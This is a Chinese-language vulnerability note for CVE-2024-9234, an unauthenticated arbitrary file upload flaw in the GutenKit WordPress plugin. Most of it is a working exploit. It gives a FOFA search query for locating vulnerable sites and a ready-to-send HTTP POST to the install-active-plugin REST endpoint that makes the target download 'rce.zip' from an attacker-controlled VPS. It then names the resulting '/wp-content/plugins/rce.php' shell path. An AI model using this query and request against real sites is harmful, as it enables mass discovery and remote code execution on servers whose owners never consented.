# WordPress插件GutenKit存在任意文件上传漏洞(CVE-2024-9234)

GutenKit - 用于 WordPress 的古腾堡块编辑器插件的页面构建器块、模式和模板容易受到任意文件上传的攻击，因为在所有版本中缺少对 install_and_activate_plugin_from_external() 函数（install-active-plugin REST API 端点）的功能检查至（并包括）2.1.0。这使得未经身份验证的攻击者可以安装和激活任意插件，或利用该功能上传像插件一样欺骗的任意文件。

## fofa

```java
body="wp-content/plugins/gutenkit-blocks-addon"
```

## poc

```javascript
POST /wp-json/gutenkit/v1/install-active-plugin HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded

plugin=http://vps-ip/rce.zip
```

![image-20241018155657418](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410181556493.png)

文件路径`/wp-content/plugins/rce.php`



## 漏洞来源

- https://nvd.nist.gov/vuln/detail/CVE-2024-9234
- [Wordpress GutenKit 插件 远程文件写入致RCE漏洞复现(CVE-2024-9234)_漏洞复现-CSDN专栏](https://download.csdn.net/blog/column/10118303/142984860)